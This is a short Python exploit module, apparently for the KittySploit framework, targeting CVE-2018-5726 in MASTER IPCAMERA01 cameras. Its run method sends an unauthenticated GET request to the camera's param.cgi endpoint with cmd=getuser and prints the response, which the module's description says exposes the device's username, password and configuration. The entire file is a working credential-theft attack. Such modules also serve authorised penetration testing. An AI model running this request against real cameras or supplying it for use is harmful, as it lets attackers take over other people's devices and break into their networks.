from kittysploit import *
from lib.protocols.http.http_client import Http_client

class Module(Auxiliary, Http_client):
	
	__info__ = {
		'name': 'Master IP CAM credentials',
		'description': 'MASTER IPCAMERA01 3.3.4.2103 devices allow remote attackers to'\
    					'obtain sensitive information via a crafted HTTP request, '\
             			'as demonstrated by the username, password, and configuration settings.',
		'author': 'KittySploit Team',
		'cve': '2018-5726',
	}

	def run(self):

		creds = self.http_request(
						method = "GET",
						path = "/web/cgi-bin/hi3510/param.cgi?cmd=getuser"
						)
		
		if creds.status_code == 200:
			for line in creds.text.split("\n"):
				print_info(line)
				Vulnerable.SUCCESS()
		else:
			fail.NotVulnerable()
